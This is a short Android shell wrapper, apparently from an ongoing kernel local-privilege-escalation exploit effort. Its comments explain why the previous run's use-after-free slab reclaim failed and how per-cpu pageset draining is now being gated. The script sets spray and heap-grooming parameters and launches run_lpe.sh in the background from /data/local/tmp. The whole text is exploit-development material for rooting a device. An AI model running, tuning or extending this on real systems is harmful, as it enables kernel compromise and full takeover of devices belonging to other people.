#!/system/bin/sh
# run15: run14 geometry + the pageset gate.
#
# run14's early discard was seen, yet X's page never came back to any cache
# (it still carried posix freepointers at the B reap, which panicked).  The
# only way that happens is that the order-1 free of X's slab did not land at
# the head of cpu0's order-1 list: free_unref_page_commit() empties the whole
# pageset when a free of order <= 3 finds count >= high with free_factor != 0,
# and X then has to come back out of the buddy through the fragments the dump
# left behind.  run14 never touched the pageset before the flush delete.
#
# IC_EARLY_PRIME leaves the pageset shallow before the flush delete (bounded
# datagram frees, counter re-read after every burst) and IC_EARLY_GATE parks
# -- before B is reaped -- if the insert still drained it.  The counter is
# read from /proc/zoneinfo, which the shell uid can see.
cd /data/local/tmp || exit 1
rm -f ic-run15.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 IC_EARLY_WAIT=1 \
IC_EARLY_PRIME=1024 IC_EARLY_GATE=1 IC_SKB_SOCKS=8 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run15.log 2>&1 &
exit 0
